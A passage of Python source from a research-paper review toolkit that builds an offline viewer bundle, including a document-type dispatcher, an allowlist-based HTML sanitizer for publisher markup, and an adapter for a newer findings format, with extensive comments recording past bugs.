            "total_pages": total,
            # Said out loud: a reader who sees 12 of 40 pages must know the
            # other 28 exist rather than concluding the document is short.
            "truncated": len(got) < total,
        }
        if failed:
            record["pages_failed_to_render"] = failed
            record["render_note"] = (
                f"{failed} of the {expected} page(s) requested from "
                f"{pdf.name} could not be rendered. Those pages are missing "
                "because OUR renderer failed on them, not because the "
                "document is short and not because a budget cut them off.")
        docs.append(record)
        pages.extend(got)
    return pages, docs


# ---------------------------------------------------------------------------
# The source pane, for documents that are not PDFs
#
# THE PANE ASSUMED A PDF AND SAID SO ONLY BY BEING EMPTY. `Source & extraction`
# rendered `pdf_pages`, and a package with no PDF got one line -- "No PDF in
# this bundle." -- with the extracted text beside it and nothing to compare it
# against. That is not a rare case: `extraction/jats.py` records that TWO corpus
# papers are Elsevier XML with no PDF at all, and a growing share arrive as
# fetched `.fulltext.html`. For those, the pane whose entire purpose is "compare
# what we read against what was published" could not show what was published.
#
# Supplements were worse. `render_all_pdfs` already rendered every PDF in the
# package and the selector could reach them, but a supplement that arrived as
# .docx, .xlsx, .html or a scanned image was not in the selector at all -- so a
# finding resting on eTable 3 pointed at a document the reader could not open,
# even though the bundle carried the file.
#
# So: one record per document, with a `kind`, and a left pane that renders each
# kind on its own terms. Where the click-to-locate contract cannot be honoured
# it is REFUSED IN WORDS rather than degraded into a pane that looks broken --
# an image has no text layer, and saying so is the honest render.
# ---------------------------------------------------------------------------

#: Where non-PDF source assets are copied inside the bundle. Images are copied
#: rather than inlined as data URIs: a 4 MB scan becomes 5.5 MB of base64 in a
#: file the browser must parse before it shows anything, and the bundle is
#: already a directory, so a sibling file costs nothing and loads lazily.
_DOC_ASSETS = "docs"

#: Per-document cap on the text inlined into `viewer.html`. A participant-level
#: spreadsheet serialises to over a megabyte (measured: 1,879,198 chars on
#: `fnins.2023.1186751`), and three of those would make the viewer slower to
#: open than the analysis was to run. Truncation is ANNOUNCED in the pane; the
#: whole file is in the bundle directory either way.
_MAX_DOC_CHARS = 300_000

#: Names that are the extraction OUTPUT rather than a published document. They
#: are already the right-hand pane, and listing them as sources to compare
#: against would invite comparing a document with itself.
_NOT_A_SOURCE = {"body.md", "abstract.md", "references.md"}

#: Suffixes that name something a reader would call a document.
_SOURCE_SUFFIXES = {
    ".pdf", ".xml", ".html", ".htm", ".xhtml", ".epub", ".docx", ".xlsx",
    ".xlsm", ".csv", ".tsv", ".txt", ".md", ".doc", ".xls",
    ".jpg", ".jpeg", ".png", ".bmp", ".tif", ".tiff", ".webp", ".gif",
}

_IMAGE_SUFFIXES = {".jpg", ".jpeg", ".png", ".bmp", ".tif", ".tiff", ".webp",
                   ".gif"}

#: What each suffix is, for the left pane's dispatch.
_KIND_BY_SUFFIX = {
    ".pdf": "pdf", ".xml": "xml",
    ".html": "html", ".htm": "html", ".xhtml": "html", ".epub": "epub",
    ".docx": "office", ".xlsx": "office", ".xlsm": "office",
    ".csv": "office", ".tsv": "office",
    ".txt": "text", ".md": "text",
    ".doc": "unsupported", ".xls": "unsupported",
}

#: Tags kept when a publisher's HTML or an EPUB chapter is shown in the left
#: pane. AN ALLOWLIST, NOT A BLOCKLIST, and the direction matters: this HTML was
#: written by a third party, it is inlined into a file the reader opens from
#: `file://`, and a blocklist is a list of the attacks someone thought of. Only
#: these tags and these attributes survive; everything else is unwrapped (its
#: text kept) or dropped. No `script`, no `style`, no `link`, no `iframe`, no
#: event handlers, no `href` that is not a fragment -- the bundle is offline by
#: contract and a live link out of it is both a network request and a leak of
#: the fact that the reader opened it.
_HTML_ALLOW_TAGS = {
    "p", "div", "span", "br", "hr", "h1", "h2", "h3", "h4", "h5", "h6",
    "ul", "ol", "li", "dl", "dt", "dd", "blockquote", "pre", "code",
    "table", "thead", "tbody", "tfoot", "tr", "td", "th", "caption",
    "b", "i", "em", "strong", "sub", "sup", "small", "u", "s",
    "figure", "figcaption", "section", "article", "abbr", "cite",
}
_HTML_ALLOW_ATTRS = {"colspan", "rowspan", "id"}


def _safe_html(raw: bytes | str) -> str:
    """Third-party HTML, reduced to an allowlist, for display in the bundle.

    Returns "" if lxml is unavailable or the parse fails -- the caller then says
    the document could not be rendered, which is a true statement, rather than
    showing an empty pane that reads as an empty document.
    """
    try:
        import lxml.html
        from lxml.etree import strip_elements
    except Exception:
        return ""
    try:
        tree = lxml.html.fromstring(raw if isinstance(raw, bytes)
                                    else raw.encode("utf-8", "replace"))
    except Exception:
        return ""
    # Whole subtrees whose CONTENT is not content. `strip_elements` with
    # `with_tail=False` removes the element and its children; unwrapping these
    # would pour javascript source into the reader's pane as text.
    strip_elements(tree, "script", "style", "noscript", "iframe", "object",
                   "embed", "svg", "math", "head", "link", "meta", "form",
                   "input", "button", "select", "textarea",
                   with_tail=False)
    for el in list(tree.iter()):
        if not isinstance(el.tag, str):        # comments, processing instructions
            el.drop_tree()
            continue
        tag = el.tag.split("}")[-1].lower()
        if tag in ("html", "body"):
            continue
        for name in list(el.attrib):
            if name.lower() not in _HTML_ALLOW_ATTRS:
                del el.attrib[name]
        if tag not in _HTML_ALLOW_TAGS:
            # Keep the words, drop the element. An unknown tag is usually a
            # publisher's own wrapper and its text is part of the article.
            el.drop_tag()
    # The body's CONTENTS, not the `<body>` element. This is mounted inside a
    # `<div>` in the viewer, and an EPUB contributes one per chapter -- so
    # keeping the wrapper would nest several `<body>` tags inside the page's
    # real one. Browsers tolerate that by silently dropping the tag, which is
    # exactly why it would never have been noticed.
    try:
        root = tree.find("body")
        if root is None:
            root = tree
        parts = [root.text or ""]
        for child in root:
            parts.append(lxml.html.tostring(child, encoding="unicode"))
        return "".join(parts)
    except Exception:
        return ""


def _grid_html(table: dict) -> str:
    """One extracted table as an HTML grid, for the right-hand pane."""
    rows = [table.get("headers") or []] + (table.get("rows") or [])
    if not any(any(str(c or "").strip() for c in r) for r in rows):
        return ""
    body = "".join(
        "<tr>" + "".join(f"<td>{html.escape(str(c or ''))}</td>" for c in row)
        + "</tr>" for row in rows if any(str(c or "").strip() for c in row))
    label = html.escape(str(table.get("label") or
                            f"Table {table.get('table_num')}"))
    caption = html.escape(str(table.get("caption") or ""))
    warn = ""
    if table.get("alignment_uncertain"):
        warn = ('<p class="muted"><b>alignment uncertain</b> -- the columns in '
                'this table were inferred, not read; a value may sit under the '
                'wrong heading.</p>')
    prov = ""
    if table.get("provenance") == "ocr_table":
        prov = ('<p class="muted"><b>transcribed by OCR</b> -- these cells were '
                'read off an image by a machine, so the exact-arithmetic checks '
                'refuse them until a human confirms them against the picture.</p>')
    return (f'<div class="blk"><b>{label}</b> {caption}{warn}{prov}'
            f"<table>{body}</table></div>")


def _text_html(text: str) -> str:
    """Any extracted text as offset-stamped blocks.

    The same `data-src-offset` contract `_body_html` gives the paper, so the
    rendered pane of a SUPPLEMENT participates in the click-to-locate sync on
    exactly the same terms as the paper's. Without the stamp the rendered view
    has no coordinates and clicking in it does nothing -- which is the bug
    `_body_html` was written to fix, and it would have been reintroduced here
    for every document that is not the paper.
    """
    out: list[str] = []
    for start, block in _blocks(text or ""):
        rendered = _report_html(block)
        if rendered.strip():
            out.append(f'<div class="blk" data-src-offset="{start}">{rendered}</div>')
    return "\n".join(out)


def _clip(text: str, name: str) -> tuple[str, str]:
    """Cap a document's text for the payload, and say so when it is capped."""
    text = text or ""
    if len(text) <= _MAX_DOC_CHARS:
        return text, ""
    return text[:_MAX_DOC_CHARS], (
        f"Showing the first {_MAX_DOC_CHARS:,} of {len(text):,} characters of "
        f"{name}. The rest is not on this page -- it was left out to keep the "
        "viewer openable, not because the document ends here. The whole file is "
        "in this bundle."
    )


def _extracted_for(path: Path) -> dict:
    """What the checks would read out of this file, via the supplement reader.

    Deliberately routed through `extract_supplement_full` rather than a
    bundle-local reimplementation: the pane's job is to show WHAT THE CHECKS
    SAW, so it has to be the same reader. A pane built on a second extraction
    would agree with the checks only by luck, and the one time it disagreed
    would be the one time a reader most needed it to be right.
    """
    try:
        from .extraction.supplements_read import extract_supplement_full
        return extract_supplement_full(path) or {}
    except Exception as exc:
        return {"error": f"{type(exc).__name__}: {exc}", "tables": [], "text": ""}


def _source_document(path: Path, doc_id: int, role: str, out_dir: Path) -> dict:
    """One non-PDF document: how to show it, and what we read out of it."""
    suffix = path.suffix.lower()
    kind = ("image" if suffix in _IMAGE_SUFFIXES
            else _KIND_BY_SUFFIX.get(suffix, "unsupported"))
    rec: dict[str, Any] = {
        "id": doc_id,
        "name": path.name,
        "role": role,
        "kind": kind,
        "label": f"{role}: {path.name}",
        # Whether the reader can click a place in the source and be taken to
        # the matching place in the extraction. Stated per document rather than
        # assumed, because the answer genuinely differs: a PDF has line
        # geometry, an HTML document has DOM elements with text, and an image
        # has neither.
        "locate": "none",
    }

    extracted = _extracted_for(path) if kind != "unsupported" else {}
    text, clipped = _clip(extracted.get("text") or "", path.name)
    tables = [t for t in (extracted.get("tables") or []) if isinstance(t, dict)]
    rec["n_tables"] = len(tables)
    rec["text"] = text
    rec["text_html"] = (_text_html(text)
                        + "".join(_grid_html(t) for t in tables[:40]))
    if clipped:
        rec["clip_note"] = clipped
    if extracted.get("error"):
        rec["extract_error"] = str(extracted["error"])
    # The distinction the OCR seam exists to preserve, carried all the way to
    # the reader: "no engine on this machine" is not "no tables in this file".
    for flag in ("ocr_unavailable", "no_text_layer", "ocr_low_confidence",
                 "unreadable_format"):
        if extracted.get(flag):
            rec[flag] = extracted[flag]

    if kind == "image":
        dest = out_dir / _DOC_ASSETS / str(doc_id)
        dest.mkdir(parents=True, exist_ok=True)
        try:
            shutil.copy2(path, dest / path.name)
            rec["img"] = f"{_DOC_ASSETS}/{doc_id}/{path.name}"
        except OSError as exc:
            rec["render_error"] = f"could not copy the image: {exc}"
        rec["note"] = (
            "This document is a PICTURE. There is no text layer to click, so "
            "the source and the extraction cannot be synchronised here -- "
            "compare them by eye. Anything read out of it was transcribed by "
            "OCR and is marked as such."
        )
    elif kind in ("html", "epub"):
        rec["source_html"] = _document_html(path, kind)
        if rec["source_html"]:
            rec["locate"] = "dom"
        else:
            rec["render_error"] = (
                "This document could not be rendered for display (its markup "
                "would not parse). What the checks read is still in the right-"
                "hand pane; the file itself is in this bundle."
            )
    elif kind in ("office", "xml", "text"):
        # There is no page image to show, so the LEFT pane shows the document
        # as the reader would read it and the RIGHT pane shows the same content
        # as the checks received it. That comparison is still the one this page
        # is for -- a table that lost a column is visible in it.
        #
        # The two renderings are IDENTICAL for these kinds, so the payload
        # carries it once and the viewer mounts it twice. Storing it twice cost
        # a third of every such document's bytes (measured: the 50 kB XML of
        # `10.1007--s11064-023-03861-8` was held three times over), and two
        # copies of one string are two chances for them to drift apart.
        rec["source_is_extraction"] = True
        rec["locate"] = "dom"
        rec["note"] = {
            "office": "This document has no pages. The left pane is the "
                      "document's own content, laid out by us.",
            "xml": "Publisher XML has no pages -- `page` is null on every "
                   "table it carries, and inventing one would put a fabricated "
                   "citation in a finding. Note what this pane can and cannot "
                   "show you here: both sides are drawn from the same XML, so "
                   "they check that the GRID survived (columns, merged cells, "
                   "footnotes) and they cannot check the XML against the "
                   "printed article. For that you need the PDF.",
            "text": "Plain text: no table structure was recovered and none was "
                    "guessed. Read the numbers with their headings.",
        }[kind]
    else:
        rec["note"] = (
            f"{path.suffix or 'This format'} cannot be opened by this toolkit, "
            "so nothing in it was read and nothing in it was checked. That is a "
            "limit of our reader, not a statement about the document."
        )
    return rec


def _document_html(path: Path, kind: str) -> str:
    """The rendered, sanitised body of an HTML or EPUB document."""
    if kind == "html":
        try:
            return _safe_html(path.read_bytes())
        except OSError:
            return ""
    import zipfile
    parts: list[str] = []
    try:
        with zipfile.ZipFile(path) as z:
            for name in sorted(n for n in z.namelist()
                               if n.lower().endswith((".xhtml", ".html", ".htm"))):
                chunk = _safe_html(z.read(name))
                if chunk.strip():
                    # Named, because an EPUB is many documents and a reader who
                    # cannot tell where one chapter ends cannot cite one.
                    parts.append(f'<h4 class="epubdoc">{html.escape(name)}</h4>'
                                 + chunk)
    except (zipfile.BadZipFile, OSError):
        return ""
    return "\n".join(parts)


#: A source document's own content, exempt from the path scrub for the same
#: reason `body_text` is: it is EVIDENCE, and `text_html` carries character
#: offsets into `text` that the click-to-locate sync does arithmetic on. A
#: substitution of a different length inside `text` would move every offset and
#: land a reader on the wrong paragraph. Everything else on the record --
#: including `extract_error`, which is the one field that routinely quotes a
#: filesystem path -- is scrubbed.
_UNSCRUBBED_DOC_KEYS = ("text", "text_html", "source_html")


def _scrub_document(doc: dict) -> dict:
    return {k: (v if k in _UNSCRUBBED_DOC_KEYS else _scrub(v))
            for k, v in doc.items()}


def source_documents(paper_dir: Path, out_dir: Path,
                     pdf_docs: list[dict]) -> list[dict]:
    """Every document in the package, PDFs first, in the viewer's own order.

    The PDF records come from `render_all_pdfs` UNCHANGED and keep their ids:
    `pdf_pages[].doc` refers to them, the selector addresses pages by that id,
    and findings anchor to document 0. Renumbering here would silently
    disconnect the page images from the selector.
    """
    docs: list[dict] = []
    for d in pdf_docs:
        docs.append({**d, "kind": "pdf", "locate": "lines",
                     "role": "paper" if d.get("id") == 0 else "supplement"})

    seen = {d.get("name") for d in pdf_docs}
    next_id = (max((d.get("id") or 0) for d in pdf_docs) + 1) if pdf_docs else 0
    for path in sorted(paper_dir.iterdir()) if paper_dir.is_dir() else []:
        if not path.is_file() or path.name in seen:
            continue
        if path.name in _NOT_A_SOURCE or path.suffix.lower() not in _SOURCE_SUFFIXES:
            continue
        if path.suffix.lower() == ".pdf":
            continue                       # handled above, with its page images
        # The publisher XML and the fetched full-text HTML are the PAPER when
        # one of them is what we read; on a package that also has a PDF they
        # are a second view of it. Either way they belong in the selector --
        # two corpus papers have NO PDF at all, and for those this pane was
        # empty.
        # THREE ROLES, NOT TWO. Reported by Greg 2026-08-11: the Source and
        # Extraction selector offered "Supplement: 10.1002--eat.24415.xml" on a
        # package whose only files are the PDF, that XML, and two JSON records
        # -- there is no supplement in it at all. The XML is the SAME PAPER in
        # another format, which the comment above already says and which the
        # code then contradicted by falling through to `supplement`.
        #
        # Calling a second view of the paper a supplement is not cosmetic: a
        # reader who opens it sees the paper's own text under a heading that
        # says it is extra material, and the supplement gate's whole vocabulary
        # -- cited, missing, not supplied to us -- is about material we do NOT
        # have. `second_view` says what it is.
        stem_is_paper = path.stem in (paper_dir.name, f"{paper_dir.name}.fulltext")
        if stem_is_paper:
            role = "paper" if not any(d.get("id") == 0 for d in pdf_docs) \
                else "second_view"
        else:
            role = "supplement"
        docs.append(_source_document(path, next_id, role, out_dir))
        next_id += 1
    return docs


def _v2_container(doc: dict) -> dict:
    """A findings-v2 document, reshaped into the container `collect` reads.

    The parallel pipeline (v1.0.0+) writes `findings.v2.json`; this viewer
    was written against the legacy `findings.json` and, until 2026-08-22,
    rendered every current run as a HOLLOW bundle -- report text and paper
    panes, zero finding cards, zero ledger -- while exiting 0. The adapter
    synthesizes the container shape so the payload plumbing (anchoring,
    coverage, anatomy, traceability) runs unchanged on v2 rows.

    Severity display: `severity` becomes the STRING "S<n>" plus the rung's
    label and colors from `severity9.as_json()` -- the ladder's single
    source, same as the workbench constants. The legacy 5-enum words are
    NEVER synthesized from a 1-9 level: "impossible" in particular is
    reachable only through the pipeline's own derivation, and a display
    mapping that mints it would put the strongest word this system can say
    on findings that never earned it.
    """
    from . import severity9
    ladder = {lv["n"]: lv for lv in severity9.as_json()["levels"]}
    cards = []
    for f in doc.get("findings") or []:
        if not isinstance(f, dict):
            continue
        adj = f.get("adjudication") or {}
        sev9 = f.get("severity")
        card = dict(f)
        card["id"] = f.get("finding_id")
        card["severity_9"] = sev9 if isinstance(sev9, int) else None
        if isinstance(sev9, int):
            card["severity"] = f"S{sev9}"
            rung = ladder.get(sev9)
            if rung:
                card["severity_label"] = rung["label"]
                card["severity_colors"] = rung["colors"]
        card["adjudication_action"] = adj.get("action")
        cards.append(card)

    def _order(c):
        # Adjudicator-dead rows (discarded/merged) sink to the bottom but are
        # RETAINED -- same convention the workbench uses (`review_issues`):
        # a discarded accusation stays on the record with its rationale.
        dead = c.get("adjudication_action") in ("discarded", "merged")
        band = {"problem": 0, "undecided": 1}.get(c.get("outcome"), 2)
        return (1 if dead else 0, band, -(c.get("severity_9") or 0),
                str(c.get("id") or ""))

    cards.sort(key=_order)
    return {"findings": cards,
            # THE REGISTER LIVES AT THE TOP LEVEL of a v2 document, not under
            # `coverage`. Carried here so the payload can expose it; the
            # viewer's legacy read is `coverage_summary.statistics_register`,
            # which no parallel run has (it writes no report.json).
            "statistics_register": doc.get("statistics_register") or [],
            # The census, from v1.23.0 onward. Same reasoning as the register
            # above: it lives at the v2 document's top level, and the viewer's
            # legacy read is `report_obj.coverage_summary`, which no parallel
            # run has because no parallel run writes a report.json.
            "coverage_summary": doc.get("coverage_summary") or {},
            "coverage": doc.get("coverage") or {},
            "anatomy": doc.get("anatomy") or {},
            "unchecked": doc.get("unchecked") or [],
            "paper_id": doc.get("paper_id"),
            "paper_metadata": doc.get("paper_metadata") or {},
            "second_look": {}}


def collect(review_dir: Path, paper_dir: Path | None = None) -> dict:
    """Gather everything the viewer renders into one payload."""
    review_dir = Path(review_dir)
    paper_dir = Path(paper_dir) if paper_dir else review_dir.parent

    findings = _load(review_dir / "findings.json") or {}
    v2_doc = _load(review_dir / "findings.v2.json")
    findings_format = "legacy"
    adjudication_summary: dict = {}
    if isinstance(v2_doc, dict) and isinstance(v2_doc.get("findings"), list):
        findings_format = "v2"
        adjudication_summary = v2_doc.get("adjudication") or {}
        findings = _v2_container(v2_doc)
    report_obj = _load(review_dir / "report.json") or {}
    # ONE READING ORDER. `report.md` prints its findings through
    # `report_render.sort_findings` -- severity, then CONSEQUENCE, then the
    # model's `rank` -- and the viewer printed them in the order they happen to
    # sit in report.json. MEASURED on the wave-3 `10.1002--eat.24415` run: the
    # report reads 1, 2, 3, 5, 7, 4, 6, 8, 9, 10 against the JSON order, so
    # four of ten numbered findings named a different finding in the two
    # documents that ship in the same bundle. Sorting here, in Python, is the
    # only place the consequence rank is computable at all -- the viewer's JS
    # has severity but no consequence ranking, which is why it was harsher: it
    # put an equally severe finding that changes nothing above one that moves a
    # conclusion. Copied, not mutated in place, so `report.json` on disk and
    # the `rank` field in it are untouched.
    from .report_render import sort_findings
    if isinstance(report_obj.get("findings"), list):
        report_obj = {**report_obj,
                      "findings": sort_findings(report_obj["findings"])}
    run_meta = _load(review_dir / "run_meta.json") or {}
    _backfill_repro_split(run_meta.get("reproducibility") or {},
                          (findings.get("findings") or []) if isinstance(findings, dict) else [],
                          report_obj if isinstance(report_obj, dict) else {})
    sandbox = _load(review_dir / "sandbox_audit.json") or {}
    report_md = ""
    p = review_dir / "report.md"
    if p.exists():
        report_md = p.read_text(encoding="utf-8", errors="replace")

    if findings_format == "v2":
        calls = (_distil_calls(_load(review_dir / "toolcalls.tool_agent.json"),
                               "tool_expert")
                 + _distil_calls(_load(review_dir / "toolcalls.science_agent.json"),
                                 "science_error")
                 + _distil_calls(_load(review_dir / "toolcalls.adjudicator.json"),
                                 "adjudicator"))
    else:
        calls = (_distil_calls(_load(review_dir / "toolcalls.stage1.json"), "sweep")
                 + _distil_calls(_load(review_dir / "toolcalls.stage2.json"),
                                 "editorial"))

    try:
        from .supplements import audit as _supp_audit
        supp = _supp_audit(paper_dir)
    except Exception:
        supp = {}

    pdfs = sorted(paper_dir.glob("*.pdf"))
    figures = []
    for d in (review_dir / "figures", paper_dir / "figures"):
        if d.is_dir():
            figures += sorted(x.name for x in d.iterdir()
                              if x.suffix.lower() in {".png", ".jpg", ".jpeg", ".webp"})

    # Embedded so the extracted text can sit beside the PDF. `file://` blocks
    # fetch, so a side-by-side that loads body.md at runtime would show an empty
    # pane on the machine it is actually opened on.
    from .extraction.jats import paper_text

    # Falls back to the XML full text when body.md is absent, so the
    # side-by-side pane is not blank for every XML-fetched paper.
    body_text = paper_text(paper_dir)

    # The run's own metadata wins; the XML fills whatever it never captured.
    # A review produced before volume/issue/corresponding-author were extracted
    # would otherwise show blanks for values sitting in the file beside it.
    meta = {**_xml_metadata(paper_dir), **{
        k: v for k, v in (findings.get("paper_metadata") or {}).items() if v}}
    references = _references(paper_dir)

    # The extractor's own verdict on the table pass, carried out beside the
    # records. A corrupt publisher file and a paper with no tables both left
    # `table_records` empty, and the viewer said "no tables were extracted" for
    # both -- so an XML that failed to parse was reported as a property of the
    # paper. `_table_records` fills this in place; see its docstring for why it
    # is an out-parameter rather than a second return value.
    table_status: dict = {}
    table_records = _table_records(paper_dir, status=table_status)

    # THE PAPER ITSELF IS MISSING, and until now that was silent.
    #
    # `bundle` resolves the paper from the review's PARENT directory. Rebuild a
    # review whose source paper has since been moved, archived or tidied away
    # and every paper-derived field comes back empty -- `body_text: ""`,
    # `table_records: []`, `table_extraction: {"xml": false, "error": ""}` --
    # while the command prints a path and exits 0. The empty `error` is the
    # tell: nothing FAILED, nothing was ever attempted.
    #
    # Not hypothetical. On 2026-08-10 I rebuilt a bundle whose paper directory
    # held only the review and the previous bundle, and OVERWROTE a good viewer
    # with one containing no paper, no tables and no text. The old bundle kept
    # its own copy under `paper/`, so the content was recoverable -- but nothing
    # anywhere said a thing was wrong.
    #
    # A bundle that cannot see the paper is one nobody should trust, and it is
    # the shape this repo keeps finding: a degraded result reported as success.
    if not body_text and not table_records:
        table_status.setdefault("error", "")
        table_status["paper_unreachable"] = (
            "No paper text and no tables: nothing readable was found in "
            f"{Path(paper_dir)}. If this review's paper was moved or cleaned up "
            "after the run, the previous bundle's `paper/` directory still holds "
            "a copy -- restore it there and rebuild, or pass --paper-dir. This "
            "bundle describes a review whose source it could not open."
        )
        print(f"WARNING: {table_status['paper_unreachable']}", file=sys.stderr)

    payload = {
        "body_text": body_text,
        # Rendered in Python, where a real markdown parser already exists. The
        # pane needs this to answer the question it is there to answer -- did
        # the tables survive extraction -- which a wall of pipe characters
        # cannot. The raw text stays alongside it: the PDF/text click sync does
        # character-offset arithmetic against it, and rendering destroys those
        # offsets.
        "body_html": _body_html(paper_dir, body_text),
        "table_records": table_records,
        "table_extraction": table_status,
        "paper_id": findings.get("paper_id") or paper_dir.name,
        "paper_title": findings.get("paper_title") or meta.get("title") or "",
        "paper_metadata": meta,
        "references": references,
        "anatomy": findings.get("anatomy") or {},
        # THE VALUE REGISTER, if this run wrote one. Absent on every bundle
        # built before it existed, so the viewer section must render its own
        # absence rather than assume the key.
        "value_register": _load(review_dir / "value_register.json") or {},
        # THE REASON THE REGISTER IS MISSING, when it is. `agent.py` writes
        # `value_register.error.txt` saying in as many words "This is OUR gap,
        # not a fact about the paper" -- and nothing loaded it, so a crashed
        # build reached the reader as an empty section blaming the bundle's age.
        "value_register_error": _read_text(review_dir / "value_register.error.txt"),
        "findings": anchor_findings(findings.get("findings") or [],
                                    pdfs[0] if pdfs else None, body_text),
        # Which universe the findings above belong to. "v2" is the parallel
        # pipeline's 1-9 ladder document (findings.v2.json); "legacy" is the
        # retired serial layout. The findings page renders each natively --
        # the 5-enum vocabulary and the ladder must never wear each other's
        # words.
        "findings_format": findings_format,
        # The adjudicator's paper-level block (verdict, paper_severity 1-9,
        # headline_finding_id, summary). Empty on legacy runs.
        "adjudication": adjudication_summary,
        "coverage": findings.get("coverage") or {},
        # Every value the tool expert read, with what it did to each. Written
        # by the parallel pipeline at the top level of findings.v2.json and
        # looked for by the viewer under the LEGACY `coverage_summary`, so on
        # every v2 run it was written by one path and read on another and the
        # block rendered empty. Found 2026-09-03.
        "statistics_register": findings.get("statistics_register") or [],
        # THE INDEPENDENT DENOMINATOR. Ported to the parallel pipeline in
        # v1.23.0 and written onto the v2 document; `report_obj` stays the
        # legacy home. Every `cs` in the page falls back to this.
        "coverage_summary": findings.get("coverage_summary") or {},
        # THE SECOND-LOOK WORKLIST. It lives in `findings.json`, because it is
        # computed for and handed to stage 2 -- so it never reached the payload
        # and the panel that renders it could not fire on a real run. Found on
        # the Romano run of 2026-08-13, hours after adding that panel: built,
        # consumed by the model, invisible to the reader, which is this
        # repository's signature defect committed twice in one day.
        "second_look": findings.get("second_look") or {},
        "unchecked": findings.get("unchecked") or [],
        "report_html": _report_html(report_md),
        "report_obj": report_obj,
        # IS THE AUDITED CELL COUNT SOMETHING THIS PIPELINE PRODUCES AT ALL?
        #
        # The fallback note below told a reader the census "was added after this
        # review ran" and that "re-running the paper at current HEAD produces
        # the audited count". For a v2 run that is FALSE: `census` is called
        # only from `agent.py` (`grep -c census parallel.py` returns 0), so
        # re-running on the current path produces the same absence. A reader was
        # told the gap was the run's age and fixable, when it is neither.
        #
        # Computed here rather than guessed in the page, because Python is where
        # the schema is known.
        # EITHER HOME COUNTS. Since v1.23.0 the parallel pipeline writes the
        # census onto the v2 document, so a run that HAS one must not be told
        # the capability is legacy-only -- that sentence was true when written
        # and becomes a lie the moment the port lands.
        "census_computed_on_this_path": bool(
            (report_obj or {}).get("coverage_summary")
            or (findings or {}).get("coverage_summary")),
        "census_is_a_legacy_capability": bool(
            str((findings or {}).get("schema_version") or "").startswith("2")
            and not (findings or {}).get("coverage_summary")),
        "run_meta": run_meta,
        "sandbox_audit": sandbox,
        "guard_audit": _guards_by_stage(sandbox),
        "calls": calls,
        # The five vignette headings, SHIPPED rather than restated in the JS.
        # `test_viewer_vocabulary_drift` keeps a register of the vocabularies
        # still hand-written in the page precisely because each one has already
        # drifted; a new one added there would join that list on day one.
        "vignette_parts": [{"key": k, "label": lab} for k, lab in _vignette.PARTS],
        "files": _bundle_files(review_dir, paper_dir, pdfs),
        "paper_facts": _paper_facts(paper_dir, body_text, review_dir, supp,
                                    figures, meta, references),
        "sankey": _sankey(calls, findings.get("findings") or [],
                          report_obj.get("findings") or []),
        "check_table": _check_table(calls, findings.get("findings") or [],
                                    report_obj.get("findings") or []),
        "figure_records": _figure_records(review_dir, paper_dir),
        # What each check that ran is entitled to conclude. See `_tool_cards`.
        "tool_cards": _tool_cards(findings.get("coverage") or {}, calls,
                                  findings.get("findings") or [], report_obj),
        # Whether a missing supplement is the publication's gap or ours.
        "supplement_retrieval": _supplement_retrieval(paper_dir),
        "acronyms": _acronyms(body_text),
        "glossary": [{**g, "detects": list(g["detects"])} for g in GLOSSARY],
        "practice": _practice(
            findings.get("anatomy") or {}, findings.get("unchecked") or [],
            _artefacts_found(body_text), supp, references,
            len([f for f in figures if not _PAGE_RENDER.match(f)]), paper_dir,
            body_text),
        "run_facts": _run_facts(review_dir, run_meta),
        "pdf_name": pdfs[0].name if pdfs else None,
        "pdf_pages": [],   # filled by build_bundle, which owns the output dir
        "figures": figures,
        "supplements": supp,
        "override_warning": OVERRIDE_WARNING,
        "disclaimer_short": DISCLAIMER_SHORT,
        "disclaimer_long": DISCLAIMER_LONG,
        "action_note": ACTION_NOTE,
    }
    # THE CLAIMS THIS DOCUMENT MAKES ABOUT ITS OWN WORK, derived once, in Python.
    #
    # Counting what traced back to the paper, and deciding whether a finding was
    # computed by a validated check, are claims about US -- in a document whose
    # whole authority is that its claims can be audited. They lived as JavaScript
    # expressions inside this template, reachable by no test, and both were
    # measurably wrong on a real bundle. Facts here; presentation stays in the JS
    # below. See `viewer_facts` for each defect and how it was measured.
    #
    # LOST ONCE ALREADY. A concurrent agent stashed this working tree mid-edit
    # and these fifteen lines never reached the commit that claimed to wire
    # them, so `D.facts` was undefined on every real bundle for four commits --
    # every corrected sentence rendering as the empty string -- while the tests
    # stayed green. `TestTheFactsActuallyReachTheBundle` now asserts on
    # `collect()` itself rather than on a rendered fragment. It then happened a
    # SECOND time, 2026-08-17: the same stash returned as an unresolved `stash
    # pop`, leaving conflict markers in this file, so `bundle.py` did not
    # import at all and 14 test modules failed at collection.
    from . import verdicts as _verdicts
    from . import viewer_facts as _vf
    _tr = _vf.traceability(payload)
    payload["facts"] = {
        "severity": _vf.severity_ledger(payload),
        "traceability": _tr,
        "traceability_sentence": _vf.traceability_sentence(_tr),
        "evidence": _vf.evidence_ledger(payload),
        "index": _vf.finding_index(payload),
        # THE CLASSIFIER TABLE ITSELF, shipped as data rather than restated in
        # JS. Both copies existed and had already drifted -- the JS `na` tier 2
        # was six alternations behind Python's, so the same reason could be
        # bucketed one way by a test and another way by the page it feeds. Every
        # pattern here is plain regex syntax both engines read identically; the
        # JS compiles them with `new RegExp(src, 'i')` so nothing has to survive
        # being written twice as a regex LITERAL.
        "refusal_kinds": [{"key": k, "label": lab, "re": pat}
                          for k, lab, pat in _vf.REFUSAL_KINDS],
        # THE VERDICT VOCABULARY, shipped for the same reason and after the
        # same failure. The comment above `VERDICT_DEF` in the JS claimed the
        # old-to-new map was "shipped in the payload (`facts.verdict`) rather
        # than duplicated here" -- it was not; no such key existed, and the JS
        # carried its own copy of both the three definitions and the legacy
        # map. Meanwhile `report_render` had no copy at all and printed the raw
        # word, so the markdown and the viewer in ONE bundle disagreed about
        # the verdict of one run. One definition, in `verdicts.py`, read by
        # every surface.
        "verdict_vocab": {"defs": dict(_verdicts.MEANING),
                          "legacy": dict(_verdicts.LEGACY)},
        # The SPLIT, as a sentence, computed here. The page renders it above the
        # list so a reader meets "3 of these 14 are our limitation" before they
        # meet a bare count of fourteen. Facts in Python; presentation in JS.
        "refusals": _vf.refusal_tally(
            [r for r in ((report_obj or {}).get("not_checked") or [])
             if isinstance(r, dict)]),
    }
    # Last step, so nothing added later can slip a machine path past it. The
    # paper's own text is exempt -- it is evidence, and the click-to-source
    # sync indexes it by character offset (see `_UNSCRUBBED_KEYS`).
    return {k: (v if k in _UNSCRUBBED_KEYS else _scrub(v))
            for k, v in payload.items()}


def build_bundle(review_dir: str | Path, out_dir: str | Path | None = None,
                 paper_dir: str | Path | None = None) -> Path:
    """Create the bundle directory and return its path."""
    review_dir = Path(review_dir)
    if not review_dir.is_dir():
